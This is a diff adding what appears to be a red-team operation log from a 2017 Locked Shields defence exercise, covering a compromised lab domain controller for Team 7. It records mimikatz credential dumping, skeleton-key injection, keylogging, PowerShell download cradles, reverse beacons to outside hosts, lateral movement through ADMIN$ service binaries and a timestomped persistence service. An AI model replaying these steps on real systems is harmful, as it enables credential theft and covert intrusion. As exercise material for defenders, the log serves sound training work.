@@ -1,0 +1,4354 @@
+# File created with adobe reader: save as.. --> text
+# PREPROCESSING IN NOTEPAD++, SUCH THAT ALL "ZONE:" ENTRIES ARE DIRECTLY BELOW CLIENT IPs --> can use this as ref point for parsing
+# Operations Notes (LS) \r\n\r\nZone --> 1 entry replaces (also page... at this point manually deleted)
+# replace "\r\n\r\nZone" with "\r\nZone"
+# delete \r\nOperations Notes (LS) \r\n\r\n and \r\nOperations Notes (LS) \r\n
+# search for PID: add manually \n for PIDS which not start at new line
+# replace protocol \r\n\r\n with protocol \r\n
+# check if all "zone" entries are directly the line below the client IP: nicolas@locked-shields:~$ cat team7CH_opnotes_proc.txt | grep -i zone -B 1
+
+Operation Notes for Team 7 
+
+Apr 27, 2017 
+
+This report documents activity on a session-by-session basis for your team. 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 4556 
+Opened: 26/04 11:21 
+
+Communication Path 
+
+hosts port protocol 
+61.160.128.9 80 HTTP 
+
+File Hashes 
+
+date hash name 
+
+26/04 12:09 4db0684a8a5a12509dd205ef1d318b6a f454.dll 
+
+Other Indicators 
+
+date type target name 
+
+26/04 11:27 service \\127.0.0.1 t84f6 
+
+Activity 
+
+date activity 
+
+26/04 11:20 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 11:20 dump hashes 
+
+26/04 11:20 host called home, sent: 583831 bytes 
+
+26/04 11:21 print working directory 
+
+26/04 11:21 host called home, sent: 8 bytes 
+
+26/04 11:22 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 11:22 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 11:22 list files in c$ 
+
+26/04 11:22 host called home, sent: 236 bytes 
+
+26/04 11:23 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 11:23 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+Page. 763 
+
+date activity 
+
+26/04 11:23 host called home, sent: 216 bytes 
+
+26/04 11:24 run: whoami /groups 
+
+26/04 11:24 host called home, sent: 22 bytes 
+
+26/04 11:27 get SYSTEM 
+
+26/04 11:28 host called home, sent: 97 bytes 
+
+26/04 11:29 dump hashes 
+
+26/04 11:29 host called home, sent: 82501 bytes 
+
+26/04 11:32 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+
+26/04 11:32 host called home, sent: 535 bytes 
+
+26/04 11:34 print working directory 
+
+26/04 11:35 host called home, sent: 8 bytes 
+
+26/04 11:47 run mimikatz's misc::skeleton command 
+
+26/04 11:47 host called home, sent: 799816 bytes 
+
+26/04 11:48 revert token 
+
+26/04 11:48 create a token for LAB\kevin.mitnick 
+
+26/04 11:48 run windows/beacon_smb/bind_pipe (\\WS4-01\pipe\Winsock\ChangeListener5643#) on WS4-01 via WMI 
+
+26/04 11:49 SSH to 10.7.3.182:22 as kevin.mitnick 
+
+26/04 11:49 host called home, sent: 210924 bytes 
+
+26/04 11:49 SSH to 10.7.3.182:22 as kevin.mitnick 
+
+26/04 11:50 host called home, sent: 849467 bytes 
+
+26/04 11:50 SSH connection failed. 
+
+26/04 11:51 host called home, sent: 849467 bytes 
+
+26/04 11:51 SSH connection failed. 
+
+26/04 12:05 run: net group 'domain admins' 
+
+26/04 12:05 host called home, sent: 33 bytes 
+
+26/04 12:06 run: net groups 'domain admins' 
+
+26/04 12:06 host called home, sent: 34 bytes 
+
+26/04 12:07 run: net group 'domain admins' 
+
+26/04 12:07 host called home, sent: 33 bytes 
+
+26/04 12:07 run: net group 'domain admins' /LAB.bluexx.ex 
+
+26/04 12:08 host called home, sent: 48 bytes 
+
+26/04 12:09 spawn windows/beacon_smb/bind_pipe (127.0.0.1:6553) in a high
+
+integrity process 
+
+26/04 12:10 host called home, sent: 316560 bytes 
+
+26/04 12:11 get userid 
+
+26/04 12:11 host called home, sent: 8 bytes 
+
+26/04 12:14 run mimikatz's sekurlsa::logonpasswords command 
+
+Page. 764 
+
+date activity 
+
+26/04 12:14 host called home, sent: 501330 bytes 
+26/04 12:14 run mimikatz's lsadump::sam command 
+26/04 12:14 host called home, sent: 799814 bytes 
+26/04 12:15 run: IEX ((new-object
+
+net.webclient).downloadstring('http://127.0.0.1:59925/')) 
+26/04 12:15 host called home, sent: 142962 bytes 
+26/04 12:16 spawn windows/beacon_smb/bind_pipe (127.0.0.1:6553) as LAB
+
+\kevin.mitnick 
+26/04 12:16 host called home, sent: 208220 bytes 
+26/04 12:21 run mimikatz's sekurlsa::logonpasswords command 
+26/04 12:22 host called home, sent: 501330 bytes 
+26/04 13:38 print working directory 
+27/04 05:40 exit 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 3852 
+Opened: 26/04 12:25 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+WS1-01 445 SMB 
+61.160.128.9 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 12:24 established link to parent beacon: WS1-01 
+26/04 12:24 run mimikatz's sekurlsa::logonpasswords command 
+26/04 12:25 host called home, sent: 501330 bytes 
+26/04 12:25 dump hashes 
+26/04 12:25 host called home, sent: 82501 bytes 
+26/04 12:27 print working directory 
+26/04 12:27 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+26/04 12:28 host called home, sent: 543 bytes 
+
+Page. 765 
+
+date activity 
+
+26/04 12:34 sleep for 5s [change made to: Beacon 10.7.3.151@4692] 
+27/04 05:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 1416 
+Opened: 26/04 13:09 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+26/04 13:06 host called home, sent: 12 bytes 
+
+26/04 13:06 steal token from PID 2440 
+
+26/04 13:06 log keystrokes in 2440 (x64) 
+
+26/04 13:06 host called home, sent: 82006 bytes 
+
+26/04 13:08 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 13:08 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 13:08 spawn (x86) windows/beacon_https/reverse_https (39.71.215.32:443) 
+
+26/04 13:08 host called home, sent: 779 bytes 
+
+26/04 13:27 dump hashes 
+
+26/04 13:27 host called home, sent: 82501 bytes 
+
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 05:42 host called home, sent: 501330 bytes 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:11 host called home, sent: 501330 bytes 
+
+27/04 06:14 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 06:14 run: type c:\Windows\Logs\resultcode.txt 
+
+27/04 06:14 host called home, sent: 202 bytes 
+
+Page. 766 
+
+date activity 
+
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:41 host called home, sent: 501330 bytes 
+27/04 07:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:11 host called home, sent: 501330 bytes 
+27/04 07:12 spawn (x86) windows/beacon_https/reverse_https (79.106.16.198:443) 
+27/04 07:12 host called home, sent: 564 bytes 
+27/04 07:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:41 host called home, sent: 501330 bytes 
+27/04 08:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:11 host called home, sent: 501330 bytes 
+27/04 08:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:11 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:41 run mimikatz's sekurlsa::logonpasswords command 
+27/04 14:11 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 4708 
+Opened: 26/04 13:09 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+Page. 767 
+
+date activity 
+
+26/04 13:06 host called home, sent: 12 bytes 
+
+26/04 13:06 steal token from PID 2440 
+
+26/04 13:06 log keystrokes in 2440 (x64) 
+
+26/04 13:06 host called home, sent: 82006 bytes 
+
+26/04 13:07 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 13:07 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 13:07 host called home, sent: 216 bytes 
+
+26/04 13:08 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:21184/')) 
+
+26/04 13:08 host called home, sent: 142962 bytes 
+
+26/04 13:08 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 13:09 host called home, sent: 501330 bytes 
+
+26/04 13:11 dump hashes 
+
+26/04 13:11 host called home, sent: 82501 bytes 
+
+26/04 13:11 run net computers 
+
+26/04 13:11 run net dclist 
+
+26/04 13:12 host called home, sent: 152695 bytes 
+
+26/04 13:12 received output from net module 
+
+26/04 13:12 received output from net module 
+
+26/04 13:12 received output from net module 
+
+26/04 13:12 received output from net module 
+
+26/04 13:13 received output from net module 
+
+26/04 13:23 run mimikatz's sekurlsa::logonpasswords command 
+
+26/04 13:23 host called home, sent: 501330 bytes 
+
+26/04 14:03 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:4609/')) 
+
+26/04 14:03 host called home, sent: 142962 bytes 
+
+26/04 15:58 take screenshot 
+
+26/04 15:58 host called home, sent: 162882 bytes 
+
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 05:42 host called home, sent: 501330 bytes 
+
+27/04 06:02 spawn (x86) windows/beacon_http/reverse_http (static.bbc.com:80) 
+
+27/04 06:02 host called home, sent: 536 bytes 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:12 host called home, sent: 501330 bytes 
+
+27/04 06:15 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex viaDNS TXT) 
+
+Page. 768 
+
+date activity 
+
+27/04 06:16 host called home, sent: 517 bytes 
+
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:41 host called home, sent: 501330 bytes 
+
+27/04 06:46 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex viaDNS TXT) 
+
+27/04 06:46 host called home, sent: 517 bytes 
+
+27/04 06:46 spawn (x86) windows/beacon_http/reverse_http (poui.ex:80) 
+
+27/04 06:46 host called home, sent: 529 bytes 
+
+27/04 07:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:11 host called home, sent: 501330 bytes 
+
+27/04 07:25 run mimikatz's !misc::skeleton command 
+
+27/04 07:25 host called home, sent: 799817 bytes 
+
+27/04 07:25 run net user on localhost 
+
+27/04 07:25 host called home, sent: 76344 bytes 
+
+27/04 07:25 received output from net module 
+
+27/04 07:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:41 host called home, sent: 501330 bytes 
+
+27/04 08:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:11 host called home, sent: 501330 bytes 
+
+27/04 08:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 14:11 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 9080 
+Opened: 27/04 06:02 
+
+Page. 769 
+
+Communication Path 
+
+hosts port protocol 
+static.bbc.com 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:11 host called home, sent: 16 bytes 
+27/04 07:31 SSH to 10.7.3.181:22 as nastyredz 
+27/04 07:31 host called home, sent: 849467 bytes 
+27/04 07:31 SSH connection failed. 
+27/04 07:31 host called home, sent: 16 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 6772 
+Opened: 27/04 06:05 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+27/04 06:07 checkin 
+
+27/04 06:07 host called home, sent: 8 bytes 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:12 host called home, sent: 501330 bytes 
+
+27/04 06:15 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 06:15 run: type c:\Windows\Logs\resultcode.txt 
+
+27/04 06:15 host called home, sent: 202 bytes 
+
+27/04 06:25 spawn (x86) windows/beacon_http/reverse_http (1.93.246.97:80) 
+
+Page. 770 
+
+date activity 
+
+27/04 06:26 host called home, sent: 533 bytes 
+
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:41 host called home, sent: 501330 bytes 
+
+27/04 07:10 spawn (x86) windows/beacon_https/reverse_https (79.106.16.198:443) 
+
+27/04 07:10 host called home, sent: 564 bytes 
+
+27/04 07:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:11 host called home, sent: 501330 bytes 
+
+27/04 07:24 run mimikatz's misc::skeleton command 
+
+27/04 07:24 host called home, sent: 799816 bytes 
+
+27/04 07:25 run mimikatz's !misc::skeleton command 
+
+27/04 07:25 host called home, sent: 799817 bytes 
+
+27/04 07:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:41 host called home, sent: 501330 bytes 
+
+27/04 08:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:11 host called home, sent: 501330 bytes 
+
+27/04 08:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:41 host called home, sent: 501330 bytes 
+
+27/04 09:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:14 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 10:14 run: type "c:\Program Files\Windows NT\checksum.txt" 
+
+27/04 10:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 14:11 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 9624 
+
+Page. 771 
+
+Opened: 27/04 06:20 
+Communication Path 
+Opened: 27/04 06:20 
+Communication Path 
+
+hosts port protocol 
+tripadvisor.ex, web.pastebin.ex 53, 80 DNS, HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:18 checkin 
+27/04 06:19 host called home, sent: 8 bytes 
+27/04 06:19 host called home, sent: 12 bytes 
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:31 steal token from PID 6408 
+27/04 06:31 log keystrokes in 6408 (x64) 
+27/04 06:31 host called home, sent: 583336 bytes 
+27/04 06:44 run net computers 
+27/04 06:45 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:45 dump hashes 
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 10128 
+Opened: 27/04 06:48 
+
+Communication Path 
+
+hosts port protocol 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 06:50 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:19429/')) 
+
+Page. 772 
+
+date activity 
+
+27/04 06:51 host called home, sent: 347059 bytes 
+27/04 06:51 sleep for 20s 
+27/04 06:52 import: /root/Downloads/AggressorScripts-master/PowerUp.ps1 
+27/04 06:52 run: Invoke-AllChecks 
+27/04 06:52 host called home, sent: 275124 bytes 
+27/04 06:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 06:59 host called home, sent: 501330 bytes 
+27/04 07:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:28 host called home, sent: 501330 bytes 
+27/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:58 host called home, sent: 501330 bytes 
+27/04 08:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:58 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 7604 
+Opened: 27/04 06:51 
+
+Communication Path 
+
+hosts port protocol 
+adfasadjhl.ex, adsfasdf.ex, poui.ex, qwert.ex, jkls.ex 80 HTTP 
+
+File Hashes 
+
+date hash name 
+27/04 06:48 
+27/04 06:50 
+93b073969bed27e110611e36d5fdcda8 \\FILES\ADMIN$\74da9dc.exe 
+6846526948183cdd4e52f8ba00442caf \\dc1.ops.blue07.ex\ADMIN$
+\347809a.exe 
+27/04 06:51 0fcad7bdede396e01c819bd834f8d42f \\ws1-05.lab.blue07.ex 
+\ADMIN$\feca856.exe 
+
+Other Indicators 
+
+Page. 773 
+
+date type target name 
+27/04 06:48 service \\FILES e75078a 
+27/04 06:50 service \\dc1.ops.blue07.ex 937b556 
+27/04 06:51 service \\ws1-05.lab.blue07.ex 31413fe 
+
+Activity 
+
+date activity 
+
+27/04 06:47 dump hashes 
+
+27/04 06:47 host called home, sent: 82501 bytes 
+
+27/04 06:47 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:47 host called home, sent: 501330 bytes 
+
+27/04 06:47 run net computers 
+
+27/04 06:47 host called home, sent: 76349 bytes 
+
+27/04 06:47 received output from net module 
+
+27/04 06:47 received output from net module 
+
+27/04 06:47 received output from net module 
+
+27/04 06:48 run mimikatz's !lsadump::sam command 
+
+27/04 06:48 host called home, sent: 799815 bytes 
+
+27/04 06:48 run windows/beacon_smb/bind_pipe (\\FILES\pipe\Winsock\ChangeListener88#) on FILES via Service Control Manager (\\FILES\ADMIN$\74da9dc.exe) 
+
+27/04 06:48 host called home, sent: 220421 bytes 
+
+27/04 06:49 established link to child beacon: FILES 
+
+27/04 06:49 run: IEX ((new-objectnet.webclient).downloadstring('http://127.0.0.1:23131/')) 
+
+27/04 06:49 host called home, sent: 142794 bytes 
+
+27/04 06:50 run windows/beacon_smb/bind_pipe (\\dc1.ops.blue07.ex\pipe\Winsock\ChangeListener88#) on dc1.ops.blue07.ex via ServiceControl Manager (\\dc1.ops.blue07.ex\ADMIN$\347809a.exe) 
+
+27/04 06:50 host called home, sent: 220493 bytes 
+
+27/04 06:51 run windows/beacon_smb/bind_pipe (\\ws1-05.lab.blue07.ex\pipe\Winsock\ChangeListener88#) on ws1-05.lab.blue07.ex via ServiceControl Manager (\\ws1-05.lab.blue07.ex\ADMIN$\feca856.exe) 
+
+27/04 06:51 host called home, sent: 220508 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: SYSTEM * 
+
+Page. 774 
+
+PID: 8848 
+Opened: 27/04 07:10 
+Communication Path 
+
+hosts port protocol 
+79.106.16.198 443 HTTPS 
+
+Activity 
+
+date activity 
+
+27/04 07:13 run: dir \\FILES\C$ 
+27/04 07:13 host called home, sent: 22 bytes 
+27/04 07:14 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:15 host called home, sent: 501330 bytes 
+27/04 07:15 dump hashes 
+27/04 07:16 host called home, sent: 82501 bytes 
+27/04 07:17 spawn (x86) windows/beacon_http/reverse_http (apexgames.ex:80) 
+27/04 07:18 host called home, sent: 534 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 8080 
+Opened: 27/04 07:12 
+
+Communication Path 
+
+hosts port protocol 
+79.106.16.198 443 HTTPS 
+
+Activity 
+
+date activity 
+
+27/04 07:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:21 host called home, sent: 501330 bytes 
+27/04 07:21 dump hashes 
+27/04 07:22 host called home, sent: 82501 bytes 
+
+Page. 775 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 7384 
+Opened: 27/04 07:18 
+
+Communication Path 
+
+hosts port protocol 
+apexgames.ex 80 HTTP 
+
+File Hashes 
+
+date hash name 
+
+27/04 07:18 524582d1d8279f72c6b2296a0ac536cb tdsvc.exe 
+
+Activity 
+
+date activity 
+
+27/04 07:18 cd c:\windows\system32 
+
+27/04 07:18 upload tdsvc.exe as tdsvc.exe 
+
+27/04 07:18 timestomp tdsvc.exe to cmd.exe 
+
+27/04 07:18 run: sc delete tdsvc 
+
+27/04 07:18 run: sc create tdsvc binPath= "C:\windows\system32\tdsvc.exe" start=
+auto DisplayName= "Thin Directory Service" 
+
+27/04 07:18 run: sc description tdsvc "Provides authentication and policy
+
+management for computers joined to domain." 
+
+27/04 07:18 run: sc start tdsvc 
+
+27/04 07:18 host called home, sent: 311731 bytes 
+
+27/04 07:26 sleep for 180s (30% jitter) 
+
+27/04 07:26 host called home, sent: 16 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 5980 
+Opened: 27/04 07:20 
+
+Page. 776 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+WS1-01 445 SMB 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 07:18 established link to parent beacon: WS1-01 
+27/04 07:18 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:18 dump hashes 
+27/04 07:18 host called home, sent: 583831 bytes 
+27/04 07:20 run: systeminfo 
+27/04 07:20 host called home, sent: 18 bytes 
+27/04 07:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:28 host called home, sent: 501330 bytes 
+27/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:58 host called home, sent: 74 bytes 
+27/04 08:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:28 host called home, sent: 74 bytes 
+27/04 08:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:58 host called home, sent: 74 bytes 
+27/04 09:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:28 host called home, sent: 74 bytes 
+27/04 09:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:58 host called home, sent: 74 bytes 
+27/04 10:19 print working directory 
+27/04 10:19 host called home, sent: 8 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 4080 
+Opened: 27/04 07:21 
+
+Communication Path 
+
+Page. 777 
+
+hosts port protocol 
+tripadvisor.ex, web.pastebin.ex 53, 80 DNS, HTTP 
+
+Activity 
+
+date activity 
+
+27/04 07:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:20 host called home, sent: 435794 bytes 
+27/04 07:20 host called home, sent: 12 bytes 
+27/04 07:20 steal token from PID 6408 
+27/04 07:20 log keystrokes in 6408 (x64) 
+27/04 07:21 host called home, sent: 82006 bytes 
+27/04 07:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 07:50 host called home, sent: 501330 bytes 
+27/04 07:50 received keystrokes 
+27/04 08:06 spawn (x86) windows/beacon_http/reverse_http (apexgames.ex:80) 
+27/04 08:06 host called home, sent: 534 bytes 
+27/04 08:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 08:20 host called home, sent: 501330 bytes 
+27/04 08:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 09:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:50 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:20 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:50 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 8884 
+Opened: 27/04 07:27 
+
+Communication Path 
+
+Page. 778 
+
+hosts port protocol 
+spamhaus.ex, weather.ex, trace.ex, limonaad.ex, a.ex, b.ex,53, 80 DNS, HTTP 
+jquery.ex, gitlab.ex, purple24.ex 
+
+Activity 
+
+date activity 
+
+27/04 07:18 checkin 
+27/04 07:27 host called home, sent: 8 bytes 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: kevin.mitnick * 
+PID: 3368 
+Opened: 27/04 08:07 
+
+Communication Path 
+
+hosts port protocol 
+apexgames.ex 80 HTTP 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 1892 
+Opened: 27/04 10:13 
+
+Communication Path 
+
+hosts port protocol 
+spamhaus.ex, weather.ex, trace.ex, limonaad.ex, a.ex, b.ex,53, 80 DNS, HTTP 
+jquery.ex, gitlab.ex, purple24.ex 
+
+Activity 
+
+date activity 
+
+27/04 10:02 checkin 
+27/04 10:13 host called home, sent: 8 bytes 
+
+Page. 779 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: tim.cook * 
+PID: 4968 
+Opened: 27/04 10:55 
+
+Communication Path 
+
+hosts port protocol 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 10:53 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 10:53 run: type "c:\Program Files\Windows NT\checksum.txt" 
+
+27/04 10:53 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:54 host called home, sent: 501544 bytes 
+
+27/04 10:56 run: whoami 
+
+27/04 10:56 host called home, sent: 14 bytes 
+
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:59 list jobs 
+
+27/04 10:59 get userid 
+
+27/04 10:59 host called home, sent: 501346 bytes 
+
+27/04 10:59 kill job 4 
+
+27/04 10:59 get userid 
+
+27/04 11:00 host called home, sent: 18 bytes 
+
+27/04 11:02 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+
+27/04 11:02 host called home, sent: 535 bytes 
+
+27/04 11:07 run: whoami /groups 
+
+27/04 11:07 host called home, sent: 22 bytes 
+
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:28 host called home, sent: 501330 bytes 
+
+27/04 11:32 spawn windows/beacon_smb/bind_pipe (127.0.0.1:5001) asWS1-01\Administrator 
+
+27/04 11:33 host called home, sent: 208246 bytes 
+
+Page. 780 
+
+date activity 
+
+27/04 11:35 spawn windows/beacon_smb/bind_pipe (127.0.0.1:5001) asWS1-05\Administrator 
+
+27/04 11:35 host called home, sent: 208229 bytes 
+
+27/04 11:44 sleep for 1s 
+
+27/04 11:44 print working directory 
+
+27/04 11:44 host called home, sent: 24 bytes 
+
+27/04 11:57 host called home, sent: 12 bytes 
+
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:58 host called home, sent: 501330 bytes 
+
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:00 print working directory 
+
+27/04 13:28 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.2 (DC3) 
+Zone: LAB 
+User: tim.cook * 
+PID: 4136 
+Opened: 27/04 11:05 
+
